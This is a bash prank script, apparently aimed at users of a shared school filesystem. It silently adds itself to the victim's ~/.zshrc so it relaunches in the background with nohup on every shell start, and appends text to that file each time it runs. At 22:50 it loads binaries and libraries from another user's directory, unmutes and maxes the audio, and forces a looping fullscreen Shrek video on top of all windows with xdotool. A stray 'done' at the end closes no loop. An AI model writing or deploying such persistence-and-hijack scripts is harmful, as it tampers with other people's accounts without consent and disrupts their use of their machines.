#!/bin/bash

if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/myshrek.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/myshrek.sh > /dev/null 2>&1 &
EOF
fi

echo "echo dinomalindinomalindinomalin" >> ~/.zshrc

target_hour=22
target_minute=50

current_time_in_minutes() {
    date +%H*60+%M | bc
}

target_time_in_minutes() {
    echo "$target_hour*60+$target_minute" | bc
}

while [ $(current_time_in_minutes) -lt $(target_time_in_minutes) ]; do
    sleep 0.1
done

export PATH=/sgoinfre/goinfre/Perso/acasamit/usr/bin:$PATH
export LD_LIBRARY_PATH=/sgoinfre/goinfre/Perso/acasamit/usr/lib:$LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/sgoinfre/goinfre/Perso/acasamit/usr/lib/x86_64-linux-gnu/:$LD_LIBRARY_PATH

pactl set-sink-mute 0 false
pactl set-sink-volume 0 +100%

cvlc --video-on-top --loop --no-video-deco --fullscreen --preferred-resolution 1080 /sgoinfre/goinfre/Perso/mochamsa/Myshrek.mp4 & 
sleep 1

window_id=`xwininfo -name "VLC media player" | awk '/Window id:/{print $4}'`

xdotool set_window --overrideredirect 1 $window_id
xdotool windowunmap --sync $window_id
xdotool windowmap --sync $window_id
xdotool windowraise $window_id

done
